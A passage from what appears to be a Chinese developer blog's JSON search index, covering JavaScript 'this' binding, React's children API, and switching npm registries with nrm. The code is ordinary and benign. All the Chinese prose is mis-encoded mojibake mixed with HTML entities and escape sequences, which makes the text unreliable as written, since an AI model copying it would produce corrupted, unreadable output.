newæ–¹å¼ä¼˜å…ˆçº§æœ€é«˜ï¼Œåªè¦æ˜¯ä½¿ç”¨newæ–¹å¼æ¥è°ƒç”¨ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œthisä¸€å®šä¼šæŒ‡å‘newè°ƒç”¨å‡½æ•°æ–°åˆ›å»ºçš„å¯¹è±¡\nfunction foo(a) { this.a = a; } var bar = new foo(2); console.log( bar.a ); // 2 ä¸‰ã€ç»‘å®šä¾‹å¤– 1. ç®­å¤´å‡½æ•° å®é™…åŸå› æ˜¯ç®­å¤´å‡½æ•°æ ¹æœ¬æ²¡æœ‰è‡ªå·±çš„this\nthisæŒ‡å‘çš„å›ºå®šåŒ–ï¼Œå¹¶ä¸æ˜¯å› ä¸ºç®­å¤´å‡½æ•°å†…éƒ¨æœ‰ç»‘å®šthisçš„æœºåˆ¶, å®é™…åŸå› ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„thisï¼Œå®ƒçš„thisæ˜¯ç»§æ‰¿è€Œæ¥ï¼Œé»˜è®¤æŒ‡å‘åœ¨å®šä¹‰å®ƒæ—¶æ‰€å¤„çš„å¯¹è±¡(å®¿ä¸»å¯¹è±¡)ã€‚ æ•è·å…¶æ‰€åœ¨ï¼ˆå³å®šä¹‰çš„ä½ç½®ï¼‰ä¸Šä¸‹æ–‡çš„thiså€¼ï¼Œä½œä¸ºè‡ªå·±çš„thiså€¼, å¦‚æœåœ¨å½“å‰çš„ç®­å¤´å‡½æ•°ä½œç”¨åŸŸä¸­æ‰¾ä¸åˆ°å˜é‡ï¼Œå°±åƒä¸Šä¸€çº§ä½œç”¨åŸŸé‡Œå»æ‰¾, å¯¼è‡´å†…éƒ¨çš„thiså°±æ˜¯å¤–å±‚ä»£ç å—çš„this\n// demo 1 function foo() { setTimeout(() =\u0026gt; { console.log(\u0026#39;id:\u0026#39;, this.id); }, 100); } var id = 21; foo.call({ id: 42 }) // id: 42 //demo 2 function Person() { this.name = \u0026#39;dog\u0026#39;; this.age = \u0026#39;18\u0026#39;; setTimeout( () =\u0026gt; { console.log(this); console.log(\u0026#39;my name:\u0026#39; + this.name + \u0026#39;\u0026amp; my age:\u0026#39; + this.age) }, 1000) } var p = Person(); 2. è¢«å¿½ç•¥çš„this å½“è¢«ç»‘å®šçš„æ˜¯nullï¼Œåˆ™ä½¿ç”¨çš„æ˜¯é»˜è®¤ç»‘å®šè§„åˆ™\n// å¦‚æœä½ æŠŠ null æˆ–è€… undefined ä½œä¸º this çš„ç»‘å®šå¯¹è±¡ä¼ å…¥ call ã€ apply æˆ–è€… bind ï¼Œè¿™äº›å€¼åœ¨è°ƒç”¨æ—¶ä¼šè¢«å¿½ç•¥ï¼Œ å®é™…åº”ç”¨çš„æ˜¯é»˜è®¤ç»‘å®šè§„åˆ™ function foo() { console.log( this.a ); } var a = 2222; foo.call( null ); // 2222 å››ã€(éšå¼)ç»‘å®šä¸¢å¤± æœ€å¸¸è§çš„thisç»‘å®šé—®é¢˜å°±æ˜¯è¢«éšå¼ç»‘å®šçš„å‡½æ•°ä¼šä¸¢å¤±ç»‘å®šå¯¹è±¡,ä¹Ÿæ˜¯å°±è¯´å®ƒä¼šåº”ç”¨é»˜è®¤ç»‘å®š,ä»è€ŒæŠŠthisç»‘å®šåˆ°å…¨å±€å¯¹è±¡æˆ–è€…undefinedä¸Š,å–å†³äºæ˜¯å¦æ˜¯ä¸¥æ ¼æ¨¡å¼\n1. å¼•ç”¨èµ‹å€¼ä¸¢å¤± function foo() { console.log( this.a ); } var obj = { a: 2, foo: foo }; var bar = obj.foo; // å‡½æ•°åˆ«å! var a = \u0026#34;oops, global\u0026#34;; // aæ˜¯å…¨å±€å¯¹è±¡çš„å±æ€§ bar(); // \u0026#34;oops, global\u0026#34; è™½ç„¶ bar æ˜¯ obj.foo çš„ä¸€ä¸ªå¼•ç”¨ï¼Œä½†æ˜¯å®é™…ä¸Šï¼Œå®ƒå¼•ç”¨çš„æ˜¯ foo å‡½æ•°æœ¬èº«ï¼Œè¿™å°±ç›¸å½“äºï¼švar bar = fooï¼Œ objå¯¹è±¡åªæ˜¯ä¸€ä¸ªä¸­é—´æ¡¥æ¢ï¼Œ obj.fooåªèµ·åˆ°ä¼ é€’å‡½æ•°çš„ä½œç”¨ï¼Œæ‰€ä»¥barè·Ÿobjå¯¹è±¡æ²¡æœ‰ä»»ä½•å…³ç³»,æ­¤æ—¶çš„ bar() å…¶å®æ˜¯ä¸€ä¸ªä¸å¸¦ä»»ä½•ä¿®é¥°çš„å‡½æ•°è°ƒç”¨. è€Œbaræœ¬èº«åˆä¸å¸¦aå±æ€§ï¼Œå› æ­¤åº”ç”¨äº†é»˜è®¤ç»‘å®š,æœ€åaåªèƒ½æŒ‡å‘window.\n2. ä¼ å‚ä¸¢å¤± function foo() { console.log( this.a ); } function doFoo(fn) { // fnå…¶å®å¼•ç”¨çš„æ˜¯foo fn(); // \u0026lt;-- è°ƒç”¨ä½ç½®! } var obj = { a: 2, foo: foo }; var a = \u0026#34;oops, global\u0026#34;; // aæ˜¯å…¨å±€å¯¹è±¡çš„å±æ€§ doFoo( obj.foo ); // \u0026#34;oops, global\u0026#34; å‚æ•°ä¼ é€’å…¶å®å°±æ˜¯ä¸€ç§éšå¼èµ‹å€¼ï¼Œå› æ­¤æˆ‘ä»¬ä¼ å…¥å‡½æ•°æ—¶ä¹Ÿä¼šè¢«éšå¼èµ‹å€¼ï¼Œæ‰€ä»¥ç»“æœå’Œä¸Šä¸€ ä¸ªä¾‹å­ä¸€æ ·\n3. å›è°ƒå‡½æ•°ä¸¢å¤± function thisTo(){ console.log(this.a); } var data={ a:2, foo:thisTo //é€šè¿‡å±æ€§å¼•ç”¨thisæ‰€åœ¨å‡½æ•° }; var a=3;//å…¨å±€å±æ€§ setTimeout(data.foo,100);// 3 æ‰€è°“ä¼ å‚ä¸¢å¤±ï¼Œå°±æ˜¯åœ¨å°†åŒ…å«thisçš„å‡½æ•°ä½œä¸ºå‚æ•°åœ¨å‡½æ•°ä¸­ä¼ é€’æ—¶ï¼ŒthisæŒ‡å‘æ”¹å˜\nsetTimeoutå‡½æ•°çš„æœ¬æ¥å†™æ³•åº”è¯¥æ˜¯setTimeout(function(){......},100)ï¼› 100msåæ‰§è¡Œçš„å‡½æ•°éƒ½åœ¨â€œ\u0026hellip;\u0026hellip;â€ä¸­ï¼Œ å¯ä»¥å°†è¦æ‰§è¡Œå‡½æ•°å®šä¹‰æˆvar fun = function(){......}, å³:setTimeout(fun,100)ï¼Œ100msåå°±æœ‰ï¼šfun()ï¼›æ‰€ä»¥æ­¤æ—¶æ­¤åˆ»æ˜¯data.fooä½œä¸ºä¸€ä¸ªå‚æ•°ï¼Œæ˜¯è¿™æ ·çš„ï¼šsetTimeout(thisTo,100);100msè¿‡åæ‰§è¡ŒthisTo()ï¼Œ å®é™…é“ç†è¿˜è·Ÿ1.1å·®ä¸å¤šï¼Œæ²¡æœ‰è°ƒç”¨thisToçš„å¯¹è±¡ï¼Œthisåªèƒ½æŒ‡å‘window å®é™…ä¸Šä½ æ²¡åŠæ³•æ§åˆ¶å›è°ƒå‡½æ•°çš„æ‰§è¡Œæ–¹å¼,æ²¡æœ‰åŠæ³•æ§åˆ¶ä¼šå½±å“ç»‘å®šçš„è°ƒç”¨ä½ç½®. å› æ­¤, å›è°ƒå‡½æ•°ä¸¢å¤±thisç»‘å®šæ˜¯éå¸¸å¸¸è§çš„,ç”šè‡³æ›´åŠ å‡ºä¹æ„æ–™çš„æ˜¯,è°ƒç”¨å›è°ƒå‡½æ•°çš„å‡½æ•°å¯èƒ½ä¼šä¿®æ”¹this,ç‰¹åˆ« æ˜¯åœ¨ä¸€äº›æµè¡Œçš„JavaScriptåº“ä¸­æ—¶é—´å¤„ç†å™¨ä¼šæŠŠå›è°ƒå‡½æ•°çš„thiså¼ºåˆ¶ç»‘å®šåˆ°è§¦å‘äº‹ä»¶çš„DOMå…ƒç´ ä¸Š\næ€»ç»“ å››ç§è§„åˆ™:\nç”±newè°ƒç”¨(newç»‘å®š) é€šè¿‡callã€apply(æ˜¾å¼ç»‘å®š)æˆ–è€…ç¡¬ç»‘å®šè°ƒç”¨ å‡½æ•°æ˜¯å¦åœ¨æŸä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ä¸­è°ƒç”¨(éšå¼ç»‘å®š) é»˜è®¤ç»‘å®š ç‰¹æ®Šæƒ…å†µç‰¹æ®Šå¤„ç†:\nç®­å¤´å‡½æ•° è¢«å¿½ç•¥çš„this ç»‘å®šä¸¢å¤± æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/js-unknown/","summary":"å¾ˆé‡è¦çš„ä¸€å¥è¯ åªæœ‰æŒæ¡äº†å¦‚ä½•åˆ›å»ºã€å…³è”å’Œæ‰©å±•å¯¹è±¡ï¼Œä½ æ‰èƒ½ç”¨ JavaScript","title":"JavaScriptä¹‹ä½ ä¸çŸ¥é“çš„this"},{"content":"reactçš„æ ¸å¿ƒæ˜¯ç»„ä»¶, ä½¿å¾—ä½ å¯ä»¥åˆ©ç”¨jsxåƒåµŒå¥—HTMLæ ‡ç­¾ä¸€æ ·\u0026hellip;\nreactçš„æ ¸å¿ƒæ˜¯ç»„ä»¶, ä½¿å¾—ä½ å¯ä»¥åˆ©ç”¨jsxåƒåµŒå¥—HTMLæ ‡ç­¾ä¸€æ ·å»ä½¿ç”¨è¿™äº›ç»„ä»¶ã€‚ ç„¶è€Œåœ¨åŒ…å«jsxçš„è¡¨è¾¾å¼ä¸­, props.childrenä¸€ç›´è´¯ç©¿å…¶ä¸­ã€‚ å½“ä½ å¼€å§‹ä½¿ç”¨Reactæ—¶, ä½ ä¸€å®šè®¤ä¸ºprops.childrenä¹Ÿå°±é‚£ä¹ˆå›äº‹, ä½†æ˜¯ä½ é”™äº†\n1. Child components å­ç»„ä»¶\nçˆ¶ç»„ä»¶ \u0026lt;MyContainer /\u0026gt; åŒ…å«äº†å‡ ä¸ªå­ç»„ä»¶ \u0026lt;MyComponent /\u0026gt;\n\u0026lt;MyContainer\u0026gt; \u0026lt;MyFirstComponent /\u0026gt; \u0026lt;MySecondComponent /\u0026gt; \u0026lt;/MyContainer\u0026gt; è¿™ä¸‰ä¸ª Component ç»„ä»¶éƒ½æˆä¸ºäº† MyContainer çš„ props.children ã€‚ ä½¿ç”¨ä¸€ä¸ªè¡¨è¾¾å¼å®¹å™¨ï¼Œçˆ¶ç»„ä»¶å°±èƒ½å¤Ÿæ¸²æŸ“å®ƒä»¬çš„å­ç»„ä»¶ï¼š\nclass MyContainer extends React.Component { render() { return \u0026lt;div\u0026gt;{this.props.children}\u0026lt;/div\u0026gt; } } å½“ç„¶, çˆ¶ç»„ä»¶å¯ä»¥å†³å®šä¸æ¸²æŸ“ä»»ä½•çš„å­ç»„ä»¶æˆ–è€…åœ¨æ¸²æŸ“ä¹‹å‰å¯¹å®ƒä»¬è¿›è¡Œæ“ä½œ\n// ä¸ç®¡ä½ å°†ä»€ä¹ˆå­ç»„ä»¶ä¼ é€’ç»™è¿™ä¸ªç»„ä»¶ï¼Œå®ƒéƒ½åªä¼šæ˜¾ç¤ºâ€œHello world!â€ class OnlySayHellow extends React.Component { render() { return \u0026lt;h1\u0026gt;Hello world!\u0026lt;/h1\u0026gt; } } 2.child å¯ä»¥æ˜¯ä»»ä½•ä¸œè¥¿ React ä¸­çš„ Childrenä¸ä¸€å®šæ˜¯ç»„ä»¶ï¼Œå®ƒä»¬å¯ä»¥æ˜¯ä»»ä½•ä¸œè¥¿\nJSXè¡¨è¾¾å¼ã€JavaScript Expressionsã€Functionsã€Booleans, Null, and Undefined\nJSXè¡¨è¾¾å¼ // component + string \u0026lt;MyContainer\u0026gt; Here is a component: \u0026lt;MyFirstComponent /\u0026gt; Here is another component: \u0026lt;MySecondComponent /\u0026gt; \u0026lt;/MyContainer\u0026gt; æ³¨æ„ JSXå°†ä¼šè‡ªåŠ¨åˆ é™¤æ¯è¡Œå¼€å¤´å’Œç»“å°¾çš„ç©ºæ ¼ï¼Œä»¥åŠç©ºè¡Œã€‚å®ƒè¿˜ä¼šæŠŠå­—ç¬¦ä¸²ä¸­é—´çš„ç©ºç™½è¡Œå‹ç¼©ä¸ºä¸€ä¸ªç©ºæ ¼\n// å¦‚ä¸‹ä»£ç ç»“æœä¸€è‡´ // code 1 \u0026lt;MyComponent\u0026gt;say hellow!\u0026lt;/MyComponent\u0026gt; // code 2 \u0026lt;MyComponent\u0026gt; say hellow! \u0026lt;/MyComponent\u0026gt; // code 3 \u0026lt;MyComponent\u0026gt; say hellow! \u0026lt;/MyComponent\u0026gt; // code 4 \u0026lt;MyComponent\u0026gt; say hellow! \u0026lt;/MyComponent\u0026gt; JavaScript Expressions function Item(props) { return \u0026lt;li\u0026gt;{props.message}\u0026lt;/li\u0026gt;; } function TodoList() { const todos = [\u0026#39;finish doc\u0026#39;, \u0026#39;submit pr\u0026#39;, \u0026#39;nag dan to review\u0026#39;]; return ( \u0026lt;ul\u0026gt; {todos.map((message) =\u0026gt; \u0026lt;Item key={message} message={message} /\u0026gt;)} \u0026lt;/ul\u0026gt; ); } Functions ä¾‹å¦‚ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ªè‡ªå®šä¹‰ç»„ä»¶ï¼Œä½ å¯ä»¥æŠŠå®ƒå½“ä½œå›è°ƒæ¥åšã€‚\n// Calls the children callback numTimes to produce a repeated component function Repeat(props) { let items = []; for (let i = 0; i \u0026lt; props.numTimes; i++) { items.push(props.children(i)); } return \u0026lt;div\u0026gt;{items}\u0026lt;/div\u0026gt;; } function ListOfTenThings() { return ( \u0026lt;Repeat numTimes={10}\u0026gt; {(index) =\u0026gt; \u0026lt;div key={index}\u0026gt;This is item {index} in the list\u0026lt;/div\u0026gt;} \u0026lt;/Repeat\u0026gt; ); } Children passed to a custom component can be anything, as long as that component transforms them into something React can understand before rendering. This usage is not common, but it works if you want to stretch what JSX is capable of.\nä¼ é€’ç»™è‡ªå®šä¹‰ç»„ä»¶çš„å­©å­å¯ä»¥æ˜¯ä»»ä½•ä¸œè¥¿ï¼Œåªè¦ç»„ä»¶å°†å®ƒä»¬è½¬æ¢æˆæŸç§ååº”å°±å¯ä»¥åœ¨å‘ˆç°ä¹‹å‰ç†è§£ã€‚ è¿™ç§ç”¨æ³•å¹¶ä¸å¸¸è§ï¼Œä½†å¦‚æœæ‚¨æƒ³æ‹‰ä¼¸JSXæ‰€èƒ½ä½¿ç”¨çš„ï¼Œå®ƒå°±å¯ä»¥å·¥ä½œ\nBooleans, Null, and Undefined Are Ignored false, null, undefined, and true are valid children. They simply donâ€™t render.\nfalse, null, undefined, å’Œ trueéƒ½æ˜¯æœ‰æ•ˆçš„å­ä»£ã€‚ä»–ä»¬åªæ˜¯ä¸æ¸²æŸ“ã€‚è¿™äº›JSXè¡¨è¾¾å¼å°†å…¨éƒ¨å‘ˆç°ä¸º åŒä¸€äº‹ç‰©\n// bad code \u0026lt;div\u0026gt; {props.messages.length \u0026amp;\u0026amp; \u0026lt;MessageList messages={props.messages} /\u0026gt; } \u0026lt;/div\u0026gt; // good code \u0026lt;div\u0026gt; {props.messages.length \u0026gt; 0 \u0026amp;\u0026amp; \u0026lt;MessageList messages={props.messages} /\u0026gt; } \u0026lt;/div\u0026gt; One caveat is that some â€œfalsyâ€ values, such as the 0 number, are still rendered by React. For example, this code will not behave as you might expect because 0 will be printed when props.messages is an empty array. To fix this, make sure that the expression before \u0026amp;\u0026amp; is always bool\nä¸ºäº†å¤„ç† this.props.children è¿™ä¸ªå°é—­çš„æ•°æ®ç»“æ„, Reactæä¾›äº†ä¸€ä¸ªé¡¶å±‚çš„API.\n3. React.Children.map å¾ªç¯\nåœ¨å¯¹åº”æ•°ç»„çš„æƒ…å†µä¸‹èƒ½èµ·ä½œç”¨ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå½“å‡½æ•°ã€å¯¹è±¡æˆ–è€…ä»»ä½•ä¸œè¥¿ä½œä¸ºchildrenä¼ é€’æ—¶ï¼Œ ä¹Ÿä¼šèµ·ä½œç”¨\nobject React.Children.map(object children, function fn [, object context]) // ä½¿ç”¨æ–¹æ³•ï¼š React.Children.map(this.props.children, function (child) { return \u0026lt;li\u0026gt;{child}\u0026lt;/li\u0026gt;; }) // å…¶ä»–æ–¹æ³• this.props.children.forEach(function (child) { return \u0026lt;li\u0026gt;{child}\u0026lt;/li\u0026gt; }) æ³¨æ„\nthis.props.children çš„å€¼æœ‰ä¸‰ç§å¯èƒ½ï¼šå¦‚æœå½“å‰ç»„ä»¶æ²¡æœ‰å­èŠ‚ç‚¹ï¼Œå®ƒå°±æ˜¯ undefined ; å¦‚æœæœ‰ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œæ•°æ®ç±»å‹æ˜¯ object ï¼›å¦‚æœæœ‰å¤šä¸ªå­èŠ‚ç‚¹ï¼Œæ•°æ®ç±»å‹å°±æ˜¯ array ã€‚ æ‰€ä»¥ï¼Œå¤„ç† this.props.children çš„æ—¶å€™è¦å°å¿ƒ\ndemo \u0026lt;IgnoreFirstChild /\u0026gt; ç»„ä»¶åœ¨è¿™é‡Œä¼šéå†æ‰€æœ‰çš„childrenï¼Œå¿½ç•¥ç¬¬ä¸€ä¸ªchildç„¶åè¿”å›å…¶ä»–çš„ class IgnoreFirstChild extends React.Component { render() { const children = this.props.children return ( \u0026lt;div\u0026gt; {React.Children.map(children, (child, i) =\u0026gt; { // Ignore the first child if (i \u0026lt; 1) return return child })} \u0026lt;/div\u0026gt; ) } } \u0026lt;IgnoreFirstChild\u0026gt; \u0026lt;h1\u0026gt;First\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;Second\u0026lt;/h1\u0026gt; // \u0026lt;- Only this is rendered \u0026lt;/IgnoreFirstChild\u0026gt; åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ this.props.children.map çš„æ–¹æ³•ã€‚ä½†æ˜¯å‡å¦‚ this.props.children æ˜¯ä¸€ä¸ªå‡½æ•°è€Œä¸æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¥ç€æˆ‘ä»¬å°±ä¼šäº§ç”Ÿä¸€ä¸ªerrorï¼ \u0026ldquo;this.props.children.map is not a function\u0026rdquo;\nReact æä¾›ä¸€ä¸ªå·¥å…·æ–¹æ³• React.Children æ¥å¤„ç† this.props.children ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ React.Children.map æ¥éå†å­èŠ‚ç‚¹ï¼Œè€Œä¸ç”¨æ‹…å¿ƒ this.props.children çš„æ•°æ®ç±»å‹æ˜¯ undefined è¿˜æ˜¯ object, ç”šè‡³æ˜¯function. ä½¿ç”¨ React.Children.map å‡½æ•°ï¼Œæ— è®ºä»€ä¹ˆéƒ½ä¸ä¼šæŠ¥é”™\n4. React.Children.forEach å¾ªç¯ ç±»ä¼¼äº React.Children.map(), ä½†æ˜¯ä¸è¿”å›å¯¹è±¡\nReact.Children.forEach(object children, function fn [, object context]) 5. React.Children.count è®¡æ•° å› ä¸ºthis.props.children å¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„ï¼Œæ£€æŸ¥ä¸€ä¸ªç»„ä»¶æœ‰å¤šå°‘ä¸ªchildrenæ˜¯éå¸¸å›°éš¾çš„\nobject React.Children.only(object children) ä¸è¦å¤©çœŸçš„ä»¥ä¸º, å¯ä»¥ä½¿ç”¨this.props.children.length, å½“ä¼ é€’çš„æ˜¯å­—ç¬¦ä¸²æˆ–è€… å‡½æ•°æ—¶ç¨‹åºä¸­æ–­å¯èƒ½ä¼šè®©ä½ å“­ï¼\nå‡è®¾æˆ‘ä»¬æœ‰ä¸ªchildï¼š\u0026quot;say hello!\u0026quot; ï¼Œä½†æ˜¯ä½¿ç”¨ .length çš„æ–¹æ³•å°†ä¼šæ˜¾ç¤ºä¸º10ã€‚\nclass ChildrenCounter extends React.Component { render() { console.log(React.Children.count(this.props.children)); return \u0026lt;p\u0026gt;{this.props.children}\u0026lt;/p\u0026gt; } } \u0026lt;ChildrenCounter\u0026gt; {() =\u0026gt; \u0026lt;div\u0026gt;First!\u0026lt;/div\u0026gt;} \u0026lt;p\u0026gt;Second!\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Third!\u0026lt;/p\u0026gt; \u0026lt;/ChildrenCounter\u0026gt; æ³¨æ„: æ­¤å¤„consoleç»“æœå¯èƒ½ä¸º2æˆ–è€…3, æœ‰çš„åœ°æ–¹ä¼šæŠ¥é”™ \u0026ldquo;Functions are not valid as a React child\u0026rdquo;, æ­¤æ—¶countä¸º2, è‹¥ä¸æŠ¥é”™, åˆ™ä¸º3\n6. React.Children.toArray è½¬æ¢ä¸ºæ•°ç»„ å¯ä»¥é€šè¿‡ React.Children.toArray æ–¹æ³•å°†childrenè½¬æ¢ä¸ºæ•°ç»„, å¦‚æœä½  éœ€è¦å¯¹å®ƒä»¬è¿›è¡Œæ’åºï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯éå¸¸æœ‰ç”¨çš„\nclass Sort extends React.Component { render() { const children = React.Children.toArray(this.props.children) // Sort and render the children return \u0026lt;p\u0026gt;{children.sort().join(\u0026#39; \u0026#39;)}\u0026lt;/p\u0026gt; } } \u0026lt;Sort\u0026gt; // We use expression containers to make sure our strings // are passed as three children, not as one string {\u0026#39;bananas\u0026#39;}{\u0026#39;oranges\u0026#39;}{\u0026#39;apples\u0026#39;} \u0026lt;/Sort\u0026gt; // æ¸²æŸ“ä¸ºä¸‰ä¸ªæ’å¥½åºçš„å­—ç¬¦ä¸² apples bananas oranges 7. React.Children.only æ‰§è¡Œå•ä¸€child\nobject React.Children.only(object children) è¿”å› children ä¸­ ä»…æœ‰çš„å­çº§, å¦åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚è¿™é‡Œä»…æœ‰çš„å­çº§, onlyæ–¹æ³•æ¥å—çš„å‚æ•°åªèƒ½ æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸èƒ½æ˜¯å¤šä¸ªå¯¹è±¡ï¼ˆæ•°ç»„ï¼‰\nclass Executioner extends React.Component { render() { return React.Children.only(this.props.children)() } } è¿™æ ·åªä¼šè¿”å›ä¸€ä¸ªchildã€‚å¦‚æœä¸æ­¢ä¸€ä¸ªchildï¼Œå®ƒå°±ä¼šæŠ›å‡ºé”™è¯¯ï¼Œè®©æ•´ä¸ªç¨‹åºé™·å…¥ä¸­æ–­â€”â€”å®Œç¾ çš„é¿å¼€äº†è¯•å›¾ç ´åç»„ä»¶çš„æ‡’æƒ°çš„å¼€å‘è€…\n8. renderChildren æ”¹å˜childrençš„å±æ€§\nclass RadioGroup extends React.Component { constructor() { super() // Bind the method to the component context this.renderChildren = this.renderChildren.bind(this) } renderChildren() { return React.Children.map(this.props.children, child =\u0026gt; { // TODO: Change the name prop to this.props.name return child }) } render() { return ( \u0026lt;div className=\u0026#34;group\u0026#34;\u0026gt; {this.renderChildren()} \u0026lt;/div\u0026gt; ) } } 9. React.cloneElement æ°¸æ’åœ°å…‹éš†å…ƒç´ \nç»™æ¯ä¸€ä¸ªchildå¢åŠ ä¸€ä¸ªnameå±æ€§\nrenderChildren() { return React.Children.map(this.props.children, child =\u0026gt; { return React.cloneElement(child, { name: this.props.name }) }) } è¿™ä¸ªåœºæ™¯å°±æ˜¯RadioGroupçš„å®ç°åŸç†\n\u0026lt;RadioGroup name=\u0026#34;sex\u0026#34;\u0026gt; \u0026lt;Radio value=\u0026#34;boy\u0026#34;\u0026gt;First\u0026lt;/Radio\u0026gt; \u0026lt;Radio value=\u0026#34;girl\u0026#34;\u0026gt;Second\u0026lt;/Radio\u0026gt; \u0026lt;/RadioGroup\u0026gt; ä¼ é€’ä¸€ä¸ªå”¯ä¸€çš„ name ç»™RadioGroup, ç›¸å½“äºç»™å…¶å†…æ¯ä¸€ä¸ªradioå¢åŠ nameå±æ€§, å±äºåŒä¸€ç»„\nå‚è€ƒ reactå®˜æ–¹æ–‡æ¡£ A deep dive into children in React æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-children/","summary":"\u003cp\u003ereactçš„æ ¸å¿ƒæ˜¯ç»„ä»¶, ä½¿å¾—ä½ å¯ä»¥åˆ©ç”¨jsxåƒåµŒå¥—HTMLæ ‡ç­¾ä¸€æ ·\u0026hellip;\u003c/p\u003e","title":"å¯¹React children çš„æ·±å…¥ç†è§£"},{"content":"node ä½œä¸ºå½“å‰æœ€å—æ¬¢è¿çš„\u0026quot;jsç‰ˆ\u0026quot;åç«¯å¼€å‘è¯­è¨€ä¹‹ä¸€ï¼Œæ— è®ºæ˜¯ä¸šåŠ¡å¼€å‘ï¼Œè¿˜æ˜¯è‡ªåŠ¨åŒ–æ„å»ºéƒ¨ç½²ï¼Œä½¿ç”¨æ˜¯å¾ˆé¢‘ç¹çš„ã€‚ä½†æ˜¯\u0026hellip;\nä¸€ã€é•œåƒæº 1. ç®¡ç†å¸¸ç”¨é•œåƒæº å®˜æ–¹: http://registry.npmjs.org æ·˜å®: https://registry.npm.taobao.org zto: http://npm.ztosys.com/ $ npm config get registry // æŸ¥çœ‹ $ npm config set registry \u0026lt;é•œåƒæº\u0026gt; // æŸ¥çœ‹ 2.nrm ä¼˜åŠ¿ï¼šä¼ ç»Ÿæ–¹æ³•åˆ‡å›å®˜æ–¹æºçš„è¯è¦é‡å†™è®¾ç½®æºçš„åœ°å€æŒ‡å‘ï¼Œæ‰§è¡Œ npm config set registry https://registry.npmjs.orgï¼›nrm å¯ä»¥è®©æˆ‘ä»¬å¿«é€Ÿåˆ‡æ¢æºï¼Œæ›´ä¾¿äºç®¡ç†ï¼Œä¸‹æ–‡ä¸­ä»‹ç»äº†ä¸€äº›å¸¸ç”¨å‘½ä»¤:\nnrm å®‰è£…\n$ npm install nrm -g nrm å¸¸ç”¨å‘½ä»¤ï¼š\n$ nrm ls // åˆ—å‡ºå¯ç”¨çš„æºï¼Œå¸¦*å·å³ä¸ºå½“å‰ä½¿ç”¨çš„é…ç½® $ nrm current // æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æº $ nrm use [æºçš„åˆ«å] // åˆ‡åˆ°æºï¼Œä¾‹å¦‚æˆ‘ä»¬è¦ä½¿ç”¨æ·˜å®æºï¼šnrm use taobao $ nrm add [æºçš„åˆ«å] [æºçš„åœ°å€] // æ·»åŠ ç§æœ‰ npm æºï¼Œä¾‹å¦‚æ·»åŠ æˆ‘å¸ç§æœ‰æºï¼šnrm add zto http://npm.ztosys.com/ $ nrm test [æºçš„åˆ«å] // æµ‹è¯•é€Ÿåº¦ $ nrm del [æºçš„åˆ«å] // åˆ é™¤æºï¼Œä¾‹å¦‚ï¼šnrm del zto äºŒã€npmåŒ…ç®¡ç† 1.å‘å¸ƒæµç¨‹ 1.1 åˆå§‹åŒ– package.json $ npm init ç»“æœ:\n{ \u0026#34;name\u0026#34;: \u0026#34;react-pc-ui\u0026#34;, // åŒ…å \u0026#34;version\u0026#34;: \u0026#34;1.0.1\u0026#34;, // ç‰ˆæœ¬å· \u0026#34;description\u0026#34;: \u0026#34;\\\u0026#34;React PC ç»„ä»¶åº“(React pc component library)\\\u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, // publish å…¥å£ \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;webpack-dev-server --open --config ./build/webpack.dev.config.js\u0026#34;, \u0026#34;build:component\u0026#34;: \u0026#34;webpack --config ./build/webpack.dist.component.config.js\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;repository\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;git\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://github.com/xxx/xxx.git\u0026#34;, \u0026#34;webpack\u0026#34;: 